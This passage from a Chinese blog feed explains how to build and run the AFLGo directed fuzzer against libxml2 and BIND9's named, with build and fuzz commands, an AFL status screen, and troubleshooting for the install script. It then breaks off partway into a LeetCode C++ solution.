class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Set aflgo-instrumenter</span></span><br><span class="line"><span class="built_in">export</span> AFLGO=~/build/llvm_tools/build-llvm/msan/aflgo</span><br><span class="line"><span class="built_in">export</span> CC=<span class="variable">$AFLGO</span>/afl-clang-fast</span><br><span class="line"><span class="built_in">export</span> CXX=<span class="variable">$AFLGO</span>/afl-clang-fast++</span><br><span class="line"><span class="built_in">export</span> SUBJECT=<span class="variable">$PWD</span>/libxml2</span><br><span class="line"><span class="built_in">export</span> TMP_DIR=<span class="variable">$PWD</span>/temp</span><br><span class="line"><span class="comment"># Set aflgo-instrumentation flags</span></span><br><span class="line"><span class="built_in">export</span> COPY_CFLAGS=<span class="variable">$CFLAGS</span></span><br><span class="line"><span class="built_in">export</span> COPY_CXXFLAGS=<span class="variable">$CXXFLAGS</span></span><br><span class="line"><span class="built_in">export</span> ADDITIONAL=<span class="string">&quot;-targets=<span class="variable">$TMP_DIR</span>/BBtargets.txt -outdir=<span class="variable">$TMP_DIR</span> -flto -fuse-ld=gold -Wl,-plugin-opt=save-temps&quot;</span></span><br><span class="line"><span class="built_in">export</span> CFLAGS=<span class="string">&quot;<span class="variable">$CFLAGS</span> <span class="variable">$ADDITIONAL</span>&quot;</span></span><br><span class="line"><span class="built_in">export</span> CXXFLAGS=<span class="string">&quot;<span class="variable">$CXXFLAGS</span> <span class="variable">$ADDITIONAL</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Build libxml2 (in order to generate CG and CFGs).</span></span><br><span class="line"><span class="comment"># Meanwhile go have a coffee ☕️</span></span><br><span class="line"><span class="built_in">export</span> LDFLAGS=-lpthread</span><br><span class="line"><span class="built_in">pushd</span> <span class="variable">$SUBJECT</span></span><br><span class="line">  ./autogen.sh</span><br><span class="line">  ./configure --disable-shared</span><br><span class="line">  make clean</span><br><span class="line">  make xmllint</span><br><span class="line"><span class="built_in">popd</span></span><br></pre></td></tr></table></figure><ul><li>计算distance，将会在<code>$TMP_DIR</code>下生成fuzz所需的<code>distance.cfg.txt</code></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$AFLGO</span>/scripts/gen_distance_fast.py <span class="variable">$SUBJECT</span> <span class="variable">$TMP_DIR</span> xmllint</span><br></pre></td></tr></table></figure><h3 id="插桩"><a href="#插桩" class="headerlink" title="插桩"></a>插桩</h3><p>使用第一步中编译出的<code>aflgo</code>工具，以及上一步生成的<code>distance</code>再次编译<code>libxml2</code>，进行插桩</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> AFLGO=~/build/llvm_tools/build-llvm/msan/aflgo</span><br><span class="line"><span class="built_in">export</span> CC=<span class="variable">$AFLGO</span>/afl-clang-fast</span><br><span class="line"><span class="built_in">export</span> CXX=<span class="variable">$AFLGO</span>/afl-clang-fast++</span><br><span class="line"><span class="built_in">export</span> SUBJECT=<span class="variable">$PWD</span>/libxml2</span><br><span class="line"><span class="built_in">export</span> TMP_DIR=<span class="variable">$PWD</span>/temp</span><br><span class="line"><span class="comment"># Set aflgo-instrumentation flags</span></span><br><span class="line"><span class="built_in">export</span> COPY_CFLAGS=<span class="variable">$CFLAGS</span></span><br><span class="line"><span class="built_in">export</span> COPY_CXXFLAGS=<span class="variable">$CXXFLAGS</span></span><br><span class="line"><span class="built_in">export</span> CFLAGS=<span class="string">&quot;<span class="variable">$COPY_CFLAGS</span> -distance=<span class="variable">$TMP_DIR</span>/distance.cfg.txt&quot;</span></span><br><span class="line"><span class="built_in">export</span> CXXFLAGS=<span class="string">&quot;<span class="variable">$COPY_CXXFLAGS</span> -distance=<span class="variable">$TMP_DIR</span>/distance.cfg.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Clean and build subject with distance instrumentation ☕️</span></span><br><span class="line"><span class="built_in">pushd</span> <span class="variable">$SUBJECT</span></span><br><span class="line">  make clean</span><br><span class="line">  ./configure --disable-shared</span><br><span class="line">  make xmllint</span><br><span class="line"><span class="built_in">popd</span></span><br></pre></td></tr></table></figure><h3 id="进行fuzz"><a href="#进行fuzz" class="headerlink" title="进行fuzz"></a>进行fuzz</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> AFLGO=~/build/llvm_tools/build-llvm/msan/aflgo</span><br><span class="line"><span class="built_in">export</span> SUBJECT=<span class="variable">$PWD</span>/libxml2</span><br><span class="line"><span class="comment"># Construct seed corpus</span></span><br><span class="line"><span class="built_in">mkdir</span> <span class="keyword">in</span></span><br><span class="line"><span class="built_in">cp</span> -r <span class="variable">$SUBJECT</span>/test/dtd* <span class="keyword">in</span></span><br><span class="line"><span class="built_in">cp</span> <span class="variable">$SUBJECT</span>/test/dtds/* <span class="keyword">in</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># echo core | sudo tee /proc/sys/kernel/core_pattern</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$AFLGO</span>/afl-fuzz -S ef709ce2 -z exp -c 45m -i <span class="keyword">in</span> -o out <span class="variable">$SUBJECT</span>/xmllint --valid --recover @@</span><br></pre></td></tr></table></figure><h3 id="fuzz结果-libxml2"><a href="#fuzz结果-libxml2" class="headerlink" title="fuzz结果(libxml2)"></a>fuzz结果(libxml2)</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">                      american fuzzy lop 2.52b (ef709ce2)</span><br><span class="line"></span><br><span class="line">┌─ process timing ─────────────────────────────────────┬─ overall results ─────┐</span><br><span class="line">│        run time : 0 days, 1 hrs, 1 min, 7 sec        │  cycles <span class="keyword">done</span> : 6      │</span><br><span class="line">│   last new path : 0 days, 0 hrs, 1 min, 54 sec       │  total paths : 2839   │</span><br><span class="line">│ last <span class="built_in">uniq</span> crash : 0 days, 0 hrs, 51 min, 32 sec      │ <span class="built_in">uniq</span> crashes : 14     │</span><br><span class="line">│  last <span class="built_in">uniq</span> hang : 0 days, 0 hrs, 2 min, 24 sec       │   <span class="built_in">uniq</span> hangs : 10     │</span><br><span class="line">├─ cycle progress ────────────────────┬─ map coverage ─┴───────────────────────┤</span><br><span class="line">│  now processing : 2828 (99.61%)     │    map density : 4.94% / 18.43%        │</span><br><span class="line">│ paths timed out : 0 (0.00%)         │ count coverage : 3.24 bits/tuple       │</span><br><span class="line">├─ stage progress ────────────────────┼─ findings <span class="keyword">in</span> depth ────────────────────┤</span><br><span class="line">│  now trying : trim 32/32            │ favored paths : 462 (16.27%)           │</span><br><span class="line">│ stage execs : 17/60 (28.33%)        │  new edges on : 787 (27.72%)           │</span><br><span class="line">│ total execs : 730k                  │ total crashes : 23 (14 unique)         │</span><br><span class="line">│  <span class="built_in">exec</span> speed : 6.90/sec (zzzz...)    │  total tmouts : 20 (13 unique)         │</span><br><span class="line">├─ fuzzing strategy yields ───────────┴───────────────┬─ path geometry ────────┤</span><br><span class="line">│   bit flips : n/a, n/a, n/a                         │    levels : 22         │</span><br><span class="line">│  byte flips : n/a, n/a, n/a                         │   pending : 1930       │</span><br><span class="line">│ arithmetics : n/a, n/a, n/a                         │  pend fav : 3          │</span><br><span class="line">│  known ints : n/a, n/a, n/a                         │ own finds : 2825       │</span><br><span class="line">│  dictionary : n/a, n/a, n/a                         │  imported : 0          │</span><br><span class="line">│       havoc : 1342/241k, 1497/369k                  │ stability : 99.49%     │</span><br><span class="line">│        trim : 41.17%/97.2k, n/a                     ├────────────────────────┘</span><br><span class="line">└─────────────────────────────────────────────────────┘          [cpu000: 90%]</span><br></pre></td></tr></table></figure><h2 id="对bind进行fuzz"><a href="#对bind进行fuzz" class="headerlink" title="对bind进行fuzz"></a>对bind进行fuzz</h2><h3 id="生成BBTarget-1"><a href="#生成BBTarget-1" class="headerlink" title="生成BBTarget"></a>生成BBTarget</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/isc-projects/bind9.git</span><br><span class="line"><span class="built_in">export</span> SUBJECT=<span class="variable">$PWD</span>/bind9</span><br><span class="line"><span class="built_in">mkdir</span> aflgo-bind9-tmp</span><br><span class="line"><span class="built_in">export</span> TMP_DIR=<span class="variable">$PWD</span>/aflgo-bind9-tmp</span><br><span class="line"></span><br><span class="line">python3 BBtarget.py <span class="variable">$SUBJECT</span> <span class="variable">$TMP_DIR</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Targets:&quot;</span></span><br><span class="line"><span class="built_in">cat</span> <span class="variable">$TMP_DIR</span>/BBtargets.txt</span><br></pre></td></tr></table></figure><blockquote><p>其中<code>BBtarget.py</code>是我写的一个脚本，用来读取之前<code>gcc-python-plugin</code>找出的<code>recv</code>,<code>send</code>,<code>vulnerable</code>和<code>blocking</code></p></blockquote><h3 id="生成distance-1"><a href="#生成distance-1" class="headerlink" title="生成distance"></a>生成distance</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Set aflgo-instrumenter</span></span><br><span class="line"><span class="built_in">export</span> AFLGO=~/build/llvm_tools/build-llvm/msan/aflgo</span><br><span class="line"><span class="built_in">export</span> CC=<span class="variable">$AFLGO</span>/afl-clang-fast</span><br><span class="line"><span class="built_in">export</span> CXX=<span class="variable">$AFLGO</span>/afl-clang-fast++</span><br><span class="line"><span class="built_in">export</span> SUBJECT=<span class="variable">$PWD</span>/bind9</span><br><span class="line"><span class="built_in">export</span> TMP_DIR=<span class="variable">$PWD</span>/aflgo-bind9-tmp</span><br><span class="line"><span class="comment"># Set aflgo-instrumentation flags</span></span><br><span class="line"><span class="built_in">export</span> COPY_CFLAGS=<span class="variable">$CFLAGS</span></span><br><span class="line"><span class="built_in">export</span> COPY_CXXFLAGS=<span class="variable">$CXXFLAGS</span></span><br><span class="line"><span class="built_in">export</span> ADDITIONAL=<span class="string">&quot;-targets=<span class="variable">$TMP_DIR</span>/BBtargets.txt -outdir=<span class="variable">$TMP_DIR</span> -flto -fuse-ld=gold -Wl,-plugin-opt=save-temps&quot;</span></span><br><span class="line"><span class="built_in">export</span> CFLAGS=<span class="string">&quot;<span class="variable">$CFLAGS</span> <span class="variable">$ADDITIONAL</span>&quot;</span></span><br><span class="line"><span class="built_in">export</span> CXXFLAGS=<span class="string">&quot;<span class="variable">$CXXFLAGS</span> <span class="variable">$ADDITIONAL</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Build bind9 (in order to generate CG and CFGs).</span></span><br><span class="line"><span class="comment"># Meanwhile go have a coffee ☕️</span></span><br><span class="line"><span class="comment"># export LDFLAGS=-lpthread</span></span><br><span class="line"><span class="built_in">pushd</span> <span class="variable">$SUBJECT</span></span><br><span class="line">  autoreconf -<span class="keyword">fi</span></span><br><span class="line">  ./configure  --enable-fuzzing=afl</span><br><span class="line">  make clean</span><br><span class="line">  make -j</span><br><span class="line"><span class="built_in">popd</span></span><br><span class="line"><span class="variable">$SUBJECT</span>/bin/named --valid --recover <span class="variable">$SUBJECT</span>/test/dtd3</span><br><span class="line"><span class="built_in">ls</span> <span class="variable">$TMP_DIR</span>/dot-files</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Function targets&quot;</span></span><br><span class="line"><span class="built_in">cat</span> <span class="variable">$TMP_DIR</span>/Ftargets.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Clean up</span></span><br><span class="line"><span class="built_in">cat</span> <span class="variable">$TMP_DIR</span>/BBnames.txt | grep -v <span class="string">&quot;^$&quot;</span>| rev | <span class="built_in">cut</span> -d: -f2- | rev | <span class="built_in">sort</span> | <span class="built_in">uniq</span> &gt; <span class="variable">$TMP_DIR</span>/BBnames2.txt &amp;&amp; <span class="built_in">mv</span> <span class="variable">$TMP_DIR</span>/BBnames2.txt <span class="variable">$TMP_DIR</span>/BBnames.txt</span><br><span class="line"><span class="built_in">cat</span> <span class="variable">$TMP_DIR</span>/BBcalls.txt | grep -Ev <span class="string">&quot;^[^,]*$|^([^,]*,)&#123;2,&#125;[^,]*$&quot;</span>| <span class="built_in">sort</span> | <span class="built_in">uniq</span> &gt; <span class="variable">$TMP_DIR</span>/BBcalls2.txt &amp;&amp; <span class="built_in">mv</span> <span class="variable">$TMP_DIR</span>/BBcalls2.txt <span class="variable">$TMP_DIR</span>/BBcalls.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate distance ☕️</span></span><br><span class="line"><span class="comment"># $AFLGO/scripts/genDistance.sh is the original, but significantly slower, version</span></span><br><span class="line"><span class="variable">$AFLGO</span>/scripts/gen_distance_fast.py <span class="variable">$SUBJECT</span>/bin/named/.libs <span class="variable">$TMP_DIR</span> named</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check distance file</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Distance values:&quot;</span></span><br><span class="line"><span class="built_in">head</span> -n5 <span class="variable">$TMP_DIR</span>/distance.cfg.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;...&quot;</span></span><br><span class="line"><span class="built_in">tail</span> -n5 <span class="variable">$TMP_DIR</span>/distance.cfg.txt</span><br></pre></td></tr></table></figure><h3 id="插桩-1"><a href="#插桩-1" class="headerlink" title="插桩"></a>插桩</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> AFLGO=~/build/llvm_tools/build-llvm/msan/aflgo</span><br><span class="line"><span class="built_in">export</span> CC=<span class="variable">$AFLGO</span>/afl-clang-fast</span><br><span class="line"><span class="built_in">export</span> CXX=<span class="variable">$AFLGO</span>/afl-clang-fast++</span><br><span class="line"><span class="built_in">export</span> SUBJECT=<span class="variable">$PWD</span>/bind9</span><br><span class="line"><span class="built_in">export</span> TMP_DIR=<span class="variable">$PWD</span>/aflgo-bind9-tmp</span><br><span class="line"><span class="comment"># Set aflgo-instrumentation flags</span></span><br><span class="line"><span class="built_in">export</span> COPY_CFLAGS=<span class="variable">$CFLAGS</span></span><br><span class="line"><span class="built_in">export</span> COPY_CXXFLAGS=<span class="variable">$CXXFLAGS</span></span><br><span class="line"><span class="built_in">export</span> CFLAGS=<span class="string">&quot;<span class="variable">$COPY_CFLAGS</span> -distance=<span class="variable">$TMP_DIR</span>/distance.cfg.txt&quot;</span></span><br><span class="line"><span class="built_in">export</span> CXXFLAGS=<span class="string">&quot;<span class="variable">$COPY_CXXFLAGS</span> -distance=<span class="variable">$TMP_DIR</span>/distance.cfg.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Clean and build subject with distance instrumentation ☕️</span></span><br><span class="line"><span class="built_in">pushd</span> <span class="variable">$SUBJECT</span></span><br><span class="line">  make clean</span><br><span class="line">  ./configure --enable-fuzzing=afl</span><br><span class="line">  make -j</span><br><span class="line"><span class="built_in">popd</span></span><br></pre></td></tr></table></figure><p>参考<a href="https://github.com/isc-projects/bind9/blob/main/fuzz/FUZZING.md">isc bind9仓库</a>中的描述，configure的时候要加上这个参数<code>--enable-fuzzing=afl</code></p><h3 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> AFLGO=~/build/llvm_tools/build-llvm/msan/aflgo</span><br><span class="line"><span class="built_in">export</span> SUBJECT=<span class="variable">$PWD</span>/bind9</span><br><span class="line"><span class="comment"># Construct seed corpus</span></span><br><span class="line"><span class="built_in">rmdir</span> <span class="keyword">in</span></span><br><span class="line"><span class="built_in">mkdir</span> <span class="keyword">in</span></span><br><span class="line"><span class="built_in">cp</span> -r <span class="variable">$SUBJECT</span>/fuzz/* ./in</span><br><span class="line"></span><br><span class="line"><span class="comment"># echo core | sudo tee /proc/sys/kernel/core_pattern</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据自己cpu占用情况并行fuzz</span></span><br><span class="line"><span class="variable">$AFLGO</span>/afl-fuzz -m 8192 -M bind9_0 -z exp -c 45m -i <span class="keyword">in</span> -o out <span class="variable">$SUBJECT</span>/bin/named/.libs/named -c @@ -g</span><br><span class="line"><span class="variable">$AFLGO</span>/afl-fuzz -m 8192 -S bind9_1 -z exp -c 45m -i <span class="keyword">in</span> -o out <span class="variable">$SUBJECT</span>/bin/named/.libs/named -c @@ -g</span><br><span class="line"><span class="variable">$AFLGO</span>/afl-fuzz -m 8192 -S bind9_2 -z exp -c 45m -i <span class="keyword">in</span> -o out <span class="variable">$SUBJECT</span>/bin/named/.libs/named -c @@ -g</span><br><span class="line"><span class="variable">$AFLGO</span>/afl-fuzz -m 8192 -S bind9_3 -z exp -c 45m -i <span class="keyword">in</span> -o out <span class="variable">$SUBJECT</span>/bin/named/.libs/named -c @@ -g</span><br></pre></td></tr></table></figure><p>最后一行的参数<code>-c -g</code>参考了<code>hongfuzz</code>对<code>bind</code>测试的<a href="https://github.com/google/honggfuzz/tree/master/examples/bind">example</a></p><p>测试用例使用的是<code>bind9/fuzz</code>下自带的</p><p><a href="https://www.mail-archive.com/bind-users@lists.isc.org/msg30792.html">Re: Fuzzing Bind</a>官方如何对named进行fuzz的一个回答，这里提到了如何使用pkt文件作为种子进行模糊测试</p><p><a href="https://github.com/CZ-NIC/dns-fuzzing">dns-fuzzing仓库</a>提供了用于测试的种子</p><blockquote><p>到此就可以使用<code>aflgo</code>对<code>named</code>进行测试了</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;aflgo的安装与测试&quot;&gt;&lt;a href=&quot;#aflgo的安装与测试&quot; class=&quot;headerlink&quot; title=&quot;aflgo的安装与测试&quot;&gt;&lt;/a&gt;aflgo的安装与测试&lt;/h2&gt;&lt;h3 id=&quot;安装依赖&quot;&gt;&lt;a href=&quot;#安装依赖&quot; class=&quot;headerlink&quot; title=&quot;安装依赖&quot;&gt;&lt;/a&gt;安装依赖&lt;/h3&gt;&lt;h4 id=&quot;执行一键安装脚本&quot;&gt;&lt;a href=&quot;#执行一键安装脚本&quot; class=&quot;headerlink&quot; title=&quot;执行一键安装脚本&quot;&gt;&lt;/a&gt;执行一键安装脚本&lt;/h4&gt;&lt;p&gt;先克隆aflgo&lt;a href=&quot;https://github.com/aflgo/aflgo.git&quot;&gt;仓库&lt;/a&gt;，脚本位于&lt;code&gt;./scripts/build&lt;/code&gt;下的&lt;code&gt;aflgo-build.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;使用一键安装脚本安装有几个问题&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;编译时报错&lt;code&gt;error: ‘numeric_limits’ is not a member of ‘std’&lt;/code&gt;，这是因为llvm源文件少引用了一个头文件，编辑文件&lt;code&gt;/root/build/llvm_tools/llvm-11.0.0.src/utils/benchmark/src/benchmark_register.h&lt;/code&gt;，加入以下头文件&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#include&amp;lt;limits&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;或在脚本解压操作完成后，执行一次以下命令&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sed -i &lt;span class=&quot;string&quot;&gt;&amp;#x27;5i#include&amp;lt;limits&amp;gt;&amp;#x27;&lt;/span&gt; ~/build/llvm_tools/llvm-11.0.0.src/utils/benchmark/src/benchmark_register.h&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;apt找不到部分包&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;E: Package &lt;span class=&quot;string&quot;&gt;&amp;#x27;python-dev&amp;#x27;&lt;/span&gt; has no installation candidate&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;E: Unable to locate package python-bs4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;在脚本&lt;code&gt;# install some packages&lt;/code&gt;下修改为以下内容&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;apt install -y python2-dev python3 python3-dev python3-pip autoconf automake libtool-bin python3-bs4 libboost-all-dev &lt;span class=&quot;comment&quot;&gt;# libclang-11.0-dev&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;apt&amp;#x2F;apt-get前没有&lt;code&gt;sudo&lt;/code&gt;，需要加上，最好不要sudo整个脚本，否则会将文件编译到&lt;code&gt;/root/build&lt;/code&gt;下&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;对于&lt;code&gt;ubuntu 16.04&lt;/code&gt;版本，将脚本中判断系统版本的地方修改成以下内容，他想判断系统是否大于&lt;code&gt;1604&lt;/code&gt;，但在16.04版本中获取的版本号是带引号的&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
    <category term="aflgo" scheme="https://jingtianer.github.io/home/tags/aflgo/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode-23</title>
    <link href="https://jingtianer.github.io/home/2023/02/27/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9323/"/>
    <id>https://jingtianer.github.io/home/2023/02/27/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9323/</id>
    <published>2023-02-27T03:14:34.000Z</published>
    <updated>2023-03-04T06:17:14.764Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1144-递减元素使数组呈锯齿状"><a href="#1144-递减元素使数组呈锯齿状" class="headerlink" title="1144. 递减元素使数组呈锯齿状"></a><a href="https://leetcode.cn/problems/decrease-elements-to-make-array-zigzag/">1144. 递减元素使数组呈锯齿状</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">movesToMakeZigzag</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> odd2less, even2less;</span><br><span class="line">        odd2less = even2less = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n &lt;= <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i] &gt;= <span class="built_in">min</span>(nums[i<span class="number">-1</span>], nums[i+<span class="number">1</span>])) &#123;</span><br><span class="line">                    even2less += nums[i] - <span class="built_in">min</span>(nums[i<span class="number">-1</span>], nums[i+<span class="number">1</span>]) + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i] &gt;= <span class="built_in">min</span>(nums[i<span class="number">-1</span>], nums[i+<span class="number">1</span>])) &#123;</span><br><span class="line">                    odd2less += nums[i] - <span class="built_in">min</span>(nums[i<span class="number">-1</span>], nums[i+<span class="number">1</span>]) + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span 